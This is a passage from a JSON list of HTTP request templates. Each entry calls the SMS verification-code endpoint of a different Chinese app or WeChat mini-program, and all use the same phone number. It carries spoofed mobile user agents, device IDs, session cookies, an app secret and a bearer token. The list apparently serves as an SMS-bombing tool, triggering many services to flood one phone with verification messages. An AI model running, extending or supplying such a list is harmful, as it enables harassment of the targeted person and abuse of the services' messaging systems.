            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx8c07a51bbe5663c0/139/page-frame.html"
        },
        "data": {"phone": "13800138000", "type": 0, "token": ""}
    },
    {
        "method": "POST",
        "url": "https://gateway.iskytrip.com/api/user/usermanger/getPhoneVerify",
        "headers": {
            "Host": "gateway.iskytrip.com", "Connection": "keep-alive", "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx5e3a6a1c50ee7515/437/page-frame.html"
        },
        "data": {
            "header": {
                "appId": "60101", "channelSource": "100", "clientName": "在机场plus微信小程序",
                "clientVersion": "2.7.2.8", "customerData": "", "deviceType": "3",
                "timestamp": 1770213729122, "token": "", "uid": "",
                "deviceId": "980fc4c7-500c-4f65-8b42-fcf616148834", "version": "v1.0.0", "scene": ""
            },
            "request": "13800138000"
        }
    },
    {
        "method": "POST",
        "url": "https://wj.cong.gsxetc.cn/index/common/send_code",
        "headers": {
            "Host": "wj.cong.gsxetc.cn", "Connection": "keep-alive", "content-type": "application/json",
            "authorization": "", "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx207c9f0330042ec0/22/page-frame.html"
        },
        "data": {"phone": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://ride-platform.hellobike.com/api?saas.user.auth.sendCode",
        "headers": {
            "Host": "ride-platform.hellobike.com", "Connection": "keep-alive", "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wxe6a2c6256e291dc9/22/page-frame.html"
        },
        "data": {
            "riskControlData": {}, "version": "6.98.0", "releaseVersion": "6.98.0", "systemCode": "306",
            "appName": "AppHelloMiniBrand", "mobileModel": "iPhone 11<iPhone12,1>", "weChatVersion": "8.0.68",
            "mobileSystem": "iOS 18.7", "SDKVersion": "3.14.1", "systemPlatform": "ios", "from": "wechat",
            "mobile": "13800138000", "tenantId": "t_chn_xgddc", "source": "0", "challenge": "u9SX2n",
            "action": "saas.user.auth.sendCode", "h5Version": "6.98.0"
        }
    },
    {
        "method": "GET",
        "url": "https://rentapi.topshopstv.com/api/smsCode/bindMobileToMember?mobileNumber=13800138000&feiyurent_appid=3",
        "headers": {
            "Host": "rentapi.topshopstv.com", "Connection": "keep-alive",
            "feiyurent-useragent": "feiyurent://5.7.0(iPhone 11<iPhone12,1>;iOS 18.7;zh_CN;ID:3-954a6aa452861b280027efa8b53a0743-3.14.1-wxapp)",
            "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx3074d9061f89c695/353/page-frame.html"
        }
    },
    {
        "method": "POST",
        "url": "https://api.chexiaoge.com/open-api/user/auth/sendLoginVerifyCode",
        "headers": {
            "Host": "api.chexiaoge.com", "Connection": "keep-alive", "channel": "WeChatApp",
            "systemType": "IOS", "content-type": "application/json", "version": "V3.2.28",
            "partySource": "WeChatApp", "x-Token": "", "chege-referer": "packageA/login/login",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/4G Language/zh_CN",
            "Referer": "https://servicewechat.com/wxa660e396d4f0a8e9/479/page-frame.html"
        },
        "data": {"mobile": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://zjappserver.xkw.com/app-server/v1/user/sendSmsCode",
        "headers": {
            "Host": "zjappserver.xkw.com", "Accept": "*/*",
            "zjapp-check": "1770261701||ios||1AC2A9D5-1767-466D-BB5F-294F84C48D64||zj.app||04F808DCD640757AEDADFB1AC914084899FD659FAC6FFB5619830032C38CB06C",
            "zjapp-version": "2.14.0", "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
            "zjapp-device-brand": "iPhone", "Accept-Language": "zh-Hans-CN;q=1.0",
            "zjapp-system-model": "iPhone 11", "zjapp-system-version": "18.7",
            "User-Agent": "ZuJuan/2.14.0 (com.xkw.zujuan; build:3; iOS 18.7.0) Alamofire/5.5.0",
            "zjapp-sub-system": "iOS", "Connection": "keep-alive", "Content-Type": "application/json",
            "Cookie": "acw_tc=76b20f8a17702616886488842ea2920a301fe3b6f0421660d534e90302ad0a"
        },
        "data": {"templateType": "LOGIN", "phone": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://api.shentingedu.com/index/authorize/sms_action",
        "headers": {
            "Host": "api.shentingedu.com", "system": "1", "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br", "Cache-Control": "no-cache",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Content-Type": "application/json",
            "currentTime": "1773450441838",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
            "Connection": "keep-alive", "systemType": "app"
        },
        "data": {"mobile": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://api.gowithtommy.com/rest/user/register_by_phone/",
        "headers": {
            "Host": "api.gowithtommy.com", "Content-Type": "application/json",
            "Cookie": "sl-session=gSbAc0N+hWk+LukZ4omHPA==", "Connection": "keep-alive",
            "If-None-Match": "", "Accept": "*/*",
            "User-Agent": "mjttSwift/11.0.8 (com.Tommy.mjtt; build:1; iOS 18.7.0) Alamofire/4.7.3",
            "Accept-Language": "zh-Hans-CN;q=1.0", "Accept-Encoding": "gzip;q=1.0, compress;q=0.5"
        },
        "data": {"phone_num": "+8613800138000"}
    },
    {
        "method": "POST",
        "url": "https://hudson-prod.localhome.cn/user/auth-code/mobile",
        "headers": {
            "Host": "hudson-prod.localhome.cn", "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*", "APP_PLATFORM": "9", "channelId": "34",
            "content-type": "application/json; charset=UTF-8", "APP_BRAND": "iPhone",
            "APP_VERSION": "3.17.1", "appId": "wx847d6fc0bdcbf6c2", "APP_MODEL": "iPhone 11<iPhone12,1>",
            "APP_SOURCE": "1", "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx847d6fc0bdcbf6c2/110/page-frame.html"
        },
        "data": {"mobile": "13800138000", "areaCode": "86"}
    },
    {
        "method": "POST",
        "url": "https://api.youzijianzhi.com/api/v1/sms/code",
        "headers": {
            "Host": "api.youzijianzhi.com", "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive", "Accept": "application/json",
            "User-Agent": "YouZiJianZhi/1.0.3 (com.zimi.YouZiJianZhi; build:10; iOS 18.7.0) Alamofire/5.11.0",
            "Accept-Language": "zh-Hans-CN;q=1.0", "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8"
        },
        "data": "mobile=13800138000&platform=1&send_key=LOGIN_CODE"
    },
    {
        "method": "GET",
        "url": "https://v4.passport.sohu.com/i/smcode/mobile/v2/signin?captchaType=signin&mobile=13800138000&way=0&pagetoken=1773450441838&appid=116006&callback=passport4014_cb1773450441836&_=1773450441839",
        "headers": {
            "Host": "v4.passport.sohu.com", "Sec-Fetch-Dest": "script",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.7 Mobile/15E148 Safari/604.1",
            "Accept": "*/*",
            "Referer": "https://m.sohu.com/login/normal?origin=1&r=https%3A%2F%2Fm.sohu.com%2F%3Fpvid%3D000115_3w_index%26jump%3Dfront&type=1",
            "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "no-cors",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Priority": "u=1, i",
            "Accept-Encoding": "gzip, deflate, br",
            "Cookie": "t=1773450441836; vt_smwp_home=7; _dfp=IMe4nZZocUv2P+N+IHIjGcx681os1wyUSs9SDcR8yF4=; cld=20260205194215; clt=1773450441; reqtype=h5; SUV=1773450439836odinRzq0; gidinf=x09998010101193cceccef05400022fdbdcaa31c3330",
            "Connection": "keep-alive"
        }
    },
    {
        "method": "GET",
        "url": "https://pai.yihaopingji.com/index.php?act=index&op=getauthcode&mobile=13800138000",
        "headers": {
            "Host": "pai.yihaopingji.com", "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Site": "same-origin", "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br", "Sec-Fetch-Mode": "cors", "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/4G Language/zh_CN",
            "Connection": "keep-alive",
            "Referer": "https://pai.yihaopingji.com/index.php?act=my&op=editinfo&type=mobile",
            "Cookie": "user_id=812775; PHPSESSID=o8p4fm7t5lp8v9nerfsuaaa1s6",
            "Sec-Fetch-Dest": "empty"
        }
    },
    {
        "method": "POST",
        "url": "https://cms.sctvcloud.com:37443/api/oauth/client/anno/authcode",
        "headers": {
            "Host": "cms.sctvcloud.com:37443", "Authorization": "Basic c2N0dl91aTpzY3R2X3VpX3NlY3JldA==",
            "Accept": "*/*", "timestamp": "1773450441839", "appVersion": "7.2.0",
            "Accept-Encoding": "gzip, deflate, br", "tenant": "YzA3MDA=",
            "Accept-Language": "zh-Hans-CN;q=1", "Content-Type": "application/json",
            "User-Agent": "SCDistrict/7.2.0 (iPhone; iOS 18.7; Scale/2.00)", "Connection": "keep-alive"
        },
        "data": {"phone": "13800138000", "authCodeType": "register"}
    },
    {
        "method": "POST",
        "url": "https://id.getkwai.com/pass/m2u/sms/code",
        "headers": {
            "Host": "id.getkwai.com", "Content-Type": "application/json",
            "Cookie": "appver=4.72.0; did=IOS_39B1A8E4-C713-468C-AE12-4B55FDA4B537; idfa=; kpf=IPHONE; kpn=M2U; language=zh-CN; m2u.api.visitor_st=; m2u.api_st=; mod=iPhone12,1; net=4g; passToken=; sys=iOS_18.7; userId=",
            "Connection": "keep-alive", "Accept": "*/*",
            "User-Agent": "1tianCam/4.72.0 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1", "Accept-Encoding": "gzip, deflate, br"
        },
        "data": {"phone": "13800138000", "countryCode": "+86", "type": 400}
    },
    {
        "method": "POST",
        "url": "https://starrypro.lastsurvivor.cn/starry/fetchVerifyCode",
        "headers": {
            "Host": "starrypro.lastsurvivor.cn", "version": "ios|2.11.14|477", "Accept": "*/*",
            "channel": "iOS", "userid": "", "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br", "token": "",
            "Content-Type": "application/x-www-form-urlencoded", "deviceid": "8A3DBB5F-4752-44B5-92A5-F8477922031A",
            "osmodel": "iPhone 11", "oaid": "", "Content-Length": "43",
            "User-Agent": "iPhone12,1(iOS/18.7) WeexGroup(",
            "distinctid": "34C2DC4D-01DF-46D9-9EF4-95FE199CC826_2", "osversion": "18.7",
            "Connection": "keep-alive"
        },
        "data": "data=%7B%22mobile%22%3A%2213800138000%22%7D"
    },
    {
        "method": "POST",
        "url": "https://ai.growingth.com/rich/user/send-sms",
        "headers": {
            "Host": "ai.growingth.com", "Content-Type": "application/json", "Connection": "keep-alive",
            "API-Version": "1", "Accept": "*/*",
            "User-Agent": "wang luo jian zhi/1.1 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1", "Accept-Encoding": "gzip, deflate, br"
        },
        "data": {"appid": "videoCut02", "appVersion": "1", "phone": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://ku.zrb.net/api/Jzk/JzkSendSmsNew",
        "headers": {
            "Host": "ku.zrb.net", "Content-Type": "application/json", "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate, br"
        },
        "data": {"mobile": "13800138000", "account": "", "password": "", "version": 39, "channeltype": 120}
    },
    {
        "method": "POST",
        "url": "https://h3cservice.h3c.com/Sms/SendCode",
        "headers": {
            "Host": "h3cservice.h3c.com", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Site": "same-origin", "Accept-Language": "zh-cn", "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors", "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://h3cservice.h3c.com",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "Referer": "https://h3cservice.h3c.com/",
            "Cookie": "ASP.NET_SessionId=2r5oyngghmdzudflqq5r3tu3",
            "Sec-Fetch-Dest": "empty", "Connection": "keep-alive"
        },
        "data": "PhoneNumber=13800138000"
    },
    {
        "method": "GET",
        "url": "https://mall.xyhljls.com/api/member/msg_send?mobile=13800138000&type=check&app_key=1&request_id=1773450441839&MALL-SIGN=de%2BL4WZHbhDe%2FREgaPfK2us4mc7nBbn83IPtGyjIXWBwGQ20XQHI2NrYt%2BZw2Ys3jLLe7YnZLkRDkXSdiJP9o2VTAo4JD%2B33CJWTOOZGxwOG70j5smUSvyDj2tGAo6%2BD",
        "headers": {
            "Host": "mall.xyhljls.com", "Content-Type": "application/x-www-form-urlencoded",
            "Applet-Authorization": "L1E/iDMNQJsThT1CE8Jr1g==",
            "Cookie": "SESSION=MmM5OGUzMWQtNzgyNC00NmFmLWEyMGUtMGY2NTNlOWQ4ZDhi",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
    },
    {
        "method": "POST",
        "url": "https://api.jihuanshe.com/api/market/auth/send-sms",
        "headers": {
            "Host": "api.jihuanshe.com", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Connection": "keep-alive", "x-device-id": "3CB80B8B-579E-49DF-9090-EE9299DE31D7",
            "Accept": "*/*",
            "User-Agent": "jihuanshe_ios/3.35.0 (com.jihuanshe.app; build:75; iOS 18.7.0) Alamofire/5.4.4 iphone",
            "Accept-Language": "zh-Hans-CN;q=1.0", "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8"
        },
        "data": "check_phone_exists=0&phone=13800138000&region_code=%2B86"
    },
    {
        "method": "POST",
        "url": "https://hsjapi.hulian120.com/userService/api/app/user/nurse/login/loginPhoneSendCode",
        "headers": {
            "Host": "hsjapi.hulian120.com", "businessSource": "1", "User-Env": "MiniProgram",
            "Accept": "*/*", "Content-Type": "application/json", "Sec-Fetch-Site": "same-site",
            "requestId": "1773450441839", "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br", "Sec-Fetch-Mode": "cors", "terminalPlatform": "2",
            "Origin": "https://ai.hulian120.com",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/WIFI Language/zh_CN",
            "Referer": "https://ai.hulian120.com/", "activity": "3248923489234", "loginType": "WEB_AI",
            "Sec-Fetch-Dest": "empty", "Connection": "keep-alive"
        },
        "data": {"loginType": "1", "phone": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://api.chezhubei.com/app/api/app/public/sendSmsCode",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; YAL-AL10 Build/HUAWEIYAL-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.666668)",
            "Connection": "Keep-Alive", "Accept": "application/json", "Accept-Encoding": "gzip",
            "Authorization": "", "X-Channel": "huawei", "X-Platform": "APP-ANDROID",
            "X-Version": "czb-app/1.0.13", "X-Oaid": "5a00c3cd-f243-4ef1-9cac-37e4311e83a1",
            "Content-Type": "application/json; charset=utf-8"
        },
        "data": {"phone": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://job.sdjuliangnet.com/chaoapi.php/index/sendsms",
        "headers": {
            "Host": "job.sdjuliangnet.com", "Content-Type": "application/json", "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate, br"
        },
        "data": {
            "type": 1, "tel": "13800138000", "app_id": 4, "channel": 55, "oaid": "uniapp",
            "userToken": "", "api_city": "广州", "api_ip_city": "广州", "loginType": 4,
            "api_ip": "120.235.13.255",
            "api_ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
            "idfa": "", "version": "130"
        }
    },
    {
        "method": "POST",
        "url": "https://new-retail-weixin-gateway-prod.diwangxu.com/sms/sendVerifyCode",
        "headers": {
            "Host": "new-retail-weixin-gateway-prod.diwangxu.com", "Connection": "keep-alive",
            "callSource": "https://new-retail-h5-prod.diwangxu.com", "Appkey": "APP",
            "sessionGenerateId": "", "content-type": "application/json",
            "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wxb7250975c223d5b8/40/page-frame.html"
        },
        "data": {"stringParam": "+8613800138000"}
    },
    {
        "method": "POST",
        "url": "https://jsyapi.evermecon.com/timelyapi/timelyvoice/auth/sendAuthCode",
        "headers": {
            "Host": "jsyapi.evermecon.com", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Connection": "keep-alive", "Accept": "*/*",
            "X-Device": "eyJjb3JlX3ZlcnNpb24iOiIyIiwiZGV2aWNlX25hbWUiOiJpUGhvbmUgMTEiLCJzb2Z0X3ZlcnNpb24iOiIyLjMiLCJzeXN0ZW1fdmVyc2lvbiI6ImlvczE4LjcifQ==",
            "apiInfo": "{\"osInfo\":\"18.7\",\"brand\":\"apple\",\"buildVersion\":\"5\",\"version\":\"2.3\",\"appKey\":\"1\",\"plat\":\"ios\",\"model\":\"iPhone 11\",\"appId\":\"1\",\"channel\":\"100\"}",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate, br",
            "User-Agent": "TimelyRemind/2 CFNetwork/3826.600.41 Darwin/24.6.0"
        },
        "data": "mobile=13800138000&type=1"
    },
    {
        "method": "POST",
        "url": "http://ly.shandongtowngas.com.cn:8015/BleDevicePayPlatform/app/jihua/getAuthCode.do?authCodeType=0&mobile=13800138000&version=1.4.6&timestamp=1773450441839",
        "headers": {
            "Host": "ly.shandongtowngas.com.cn:8015", "Content-Type": "application/json",
            "Connection": "keep-alive", "Proxy-Connection": "keep-alive", "Accept": "*/*",
            "User-Agent": "%E8%93%9D%E7%89%99%E5%85%85%E5%80%BC%E6%98%93/1 CFNetwork/3826.600.41 Darwin/24.6.0",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate"
        },
        "data": {"mobile": "13800138000", "authCodeType": "0"}
    },
    {
        "method": "POST",
        "url": "https://mfapi.greenlr.com/sendSms/getCheckCode",
        "headers": {
            "Host": "mfapi.greenlr.com", "Accept": "*/*", "appSecret": "akffas7239hrewoqriewqr",
            "source": "ios", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-Hans-CN;q=1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "memberCash/9.10 (iPhone; iOS 18.7; Scale/2.00)",
            "appKey": "roiueqo9023jofjlajfdj", "Connection": "keep-alive",
            "sign": "DE8B45B8203F6A08391147A72BB45654"
        },
        "data": "phone=13800138000&type=1"
    },
    {
        "method": "POST",
        "url": "https://m.94lives.com/api/auth/sendPhoneCode",
        "headers": {
            "Host": "m.94lives.com", "deviceNumber": "BB976B03-70D7-4602-BD6F-2E8EF576A7B8",
            "Content-Type": "application/json;charset=UTF-8", "Authorization": "", "Accept": "*/*",
            "browserType": "iOS", "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
            "iOSVersion": "1.1.9", "cid": "", "Accept-Language": "zh-Hans-CN;q=1.0", "clientType": "iOS",
            "language": "0",
            "User-Agent": "94LIVES/1.1.9 (com.ninetyfour.cn; build:60; iOS 18.7.0) Alamofire/5.10.2",
            "currency": "23", "Cookie": "JSESSIONID=6AF60A037165361453056A2AC292ADBB",
            "qwer": "eyJhZGRyZXNzIjoi5bm/5bee5biCLCDlub/kuJznnIEsIOS4reWbvSIsImxvbmdpdHVkZSI6MTEzLjQ3NzkwNDgwODkzMzU3LCJsYXRpdHVkZSI6MjMuNDMzNjIzMjI2MDMzNTk2fQ==",
            "Connection": "keep-alive"
        },
        "data": {
            "captchaVerification": "", "countryCode": "CN", "phone": "13800138000",
            "type": "2", "areaCode": "86"
        }
    },
    {
        "method": "POST",
        "url": "https://app.bac365.com/camel_wechat_mini_oil_server/sendVerifyMessage",
        "headers": {
            "Host": "app.bac365.com", "channel": "app", "Content-Type": "application/json",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive", "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
            "timestamp": "1773450441", "Authorization": "Bearer ", "Content-Length": "39"
        },
        "data": {"phone": "13800138000", "channel": "app"}
    },
    {
        "method": "GET",
        "url": "https://api.mall.leyifan.cn/api/front/phone/sendSmsCode?phone=13800138000",
        "headers": {
            "Host": "api.mall.leyifan.cn", "system": "ios", "Accept": "*/*", "App-Version": "30822",
            "Clientid": "37a3cffb-f033-4267-b16d-e21fbbb759593", "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br", "platform": "app", "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
            "lang": "chs", "Appplatform": "ios_cn", "Origin-channel": "ios_cn",
            "Cookie": "https_waf_cookie=d8f6cb86-1ef5-4babf2e02f144500a8071f58dc7448bb82cb",
            "UseDomain": "leyifan", "Connection": "keep-alive"
        }
    },
    {
        "method": "GET",
        "url": "https://www.baojianstore.com/Appshop/AppShopHandler.ashx?action=VerficationPhoneOrEmail&value=13800138000",
        "headers": {
            "Host": "www.baojianstore.com", "Accept": "*/*", "Origin": "https://h5.baojian.com",
            "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "Referer": "https://h5.baojian.com/", "Sec-Fetch-Dest": "empty",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9"
        }
    },
    {
        "method": "POST",
        "url": "https://d2m0k739byzwun.cloudfront.net/api/app/notification/captcha",
        "headers": {
            "User-Agent": "DevID%3Dlld5a00c3cd-f243-4ef1-9cac-37e4311e83a1%3BDevType%3DHWYAL%3A29%3Aid%3DHUAWEIYAL-AL10%3BSysType%3Dandroid%3BVer%3D1.3.1%3BBuildID%3Ddark.jaYec.msLgF%3BMac%3DD2%3ADF%3AB6%3AA2%3AB2%3A97%3BGlobalDevID%3Dnull",
            "Accept-Encoding": "*", "Content-Type": "application/json",
            "x-api-key": "timestamp=1773450441;sign=8dd5664c04fb929be7ec5f69a3319af8a9c6adc8;nonce=61317618-95bb-45b2-9dc7-b1ac7135cca3",
            "device": "android",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0aW1lc3RhbXAiOjE3NzAyODQ4MzMwNzc5OTQ1MDAsInR5cGUiOjAsInVpZCI6NTQ2ODgyNjN9.jw5QCTHSA3X_1WOAT8o1lHiyILJDuUUP1tuYp8cDjHE",
            "api_version": "1.0.0", "content-type": "application/json;charset=UTF-8"
        },
        "data": {"type": 1, "mobile": "+8613800138000"}
    },
    {
        "method": "POST",
        "url": "https://www.shanxiaobai.com/app.html?is_api=1&act=sms",
        "headers": {
            "Host": "www.shanxiaobai.com", "X-DEVICE-OS-PRODUCT": "iPhone12,1", "X-Api-Ver": "36",
            "Cookie": "PHPSESSID=uvsicg4sm7ta7quuu9i4rm2l81",
            "User-Agent": "WhiteGoods/3.3.0 (iPhone; iOS 18.7; Scale/2.00)", "X-App-Name": "com.uping.white",
            "X-DEVICE-OS-VER": "18.7", "X-DEVICE-TYPE": "ios",
            "X-DEVICE-TOKEN": "612cd2033713ef86e7c19ab1a3b48e6d96f836265f8f1e8671c70282396485b4",
            "X-DEVICE-OS": "IOS", "X-App-Ver": "3.3.0", "Accept-Language": "zh-Hans-CN;q=1",
            "IDFV": "889E8142-68CF-42C3-875C-6F2B8386CD12", "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded", "X-TOKEN": "",
            "Accept-Encoding": "gzip, deflate, br", "IDFA": "", "Connection": "keep-alive"
        },
        "data": "mobile=13800138000&type=login"
    },
    {
        "method": "GET",
        "url": "https://api.daxianghome.com/user/login?mobile=13800138000",
        "headers": {
            "Host": "api.daxianghome.com", "Content-Type": "application/json", "Accept": "*/*",
            "User-Agent": "DaXiang/1.7.1 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1", "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
    },
    {
        "method": "POST",
        "url": "https://app.tuozhe8.com/v2/Login/alidayu_sms",
        "headers": {
            "Host": "app.tuozhe8.com", "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive", "Accept": "*/*",
            "User-Agent": "TZDesignApp/202404131530 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1", "Accept-Encoding": "gzip, deflate, br"
        },
        "data": "mobile=13800138000&validate=&version=3.5.1"
    },
    {
        "method": "POST",
        "url": "https://agent.jieyoucloud.com/api/v1/sendSmsVerificationCode?phoneNumber=13800138000",
        "headers": {
            "Host": "agent.jieyoucloud.com", "Connection": "keep-alive",
            "content-type": "application/x-www-form-urlencoded", "Authorization": "Bearer ",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx979378000669bc89/57/page-frame.html"
        }
    },
    {
        "method": "GET",
        "url": "https://api.zhiguohulian.com/webapp/v1/user/code?phone=13800138000&package=xiaozhi&thirdparty=xiaozhi",
        "headers": {
            "Host": "api.zhiguohulian.com", "Connection": "keep-alive", "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
